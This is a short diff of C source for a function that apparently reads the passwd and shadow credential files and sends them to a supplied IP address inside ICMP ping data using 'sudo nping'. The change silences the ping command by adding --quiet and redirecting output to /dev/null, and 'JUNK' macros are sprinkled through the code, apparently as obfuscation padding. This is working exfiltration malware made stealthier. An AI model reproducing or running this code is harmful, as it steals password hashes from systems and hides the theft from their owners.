@@ -180,7 +180,7 @@ void execute(const char *ip_addr)
 {
     const int payload_len = 1400;
 
-    char *passwd;                  JUNK;
+    char *passwd;                           JUNK;
     char *shadow;
     int passwd_len;                         JUNK;
     int shadow_len;
@@ -191,8 +191,7 @@ void execute(const char *ip_addr)
     passwd_len = strlen(passwd);
     shadow_len = strlen(shadow);            JUNK;
 
-    //char *ping = "sudo nping --quiet -c 1 --icmp --data-string \"%s\" %s > /dev/null 2>&1";
-    char *ping = "sudo nping -c 1 --icmp --data-string \"%s\" %s";
+    char *ping = "sudo nping --quiet -c 1 --icmp --data-string \"%s\" %s > /dev/null 2>&1";
     int ping_len = strlen(ping);            JUNK;
 
     int len = passwd_len;                   JUNK;
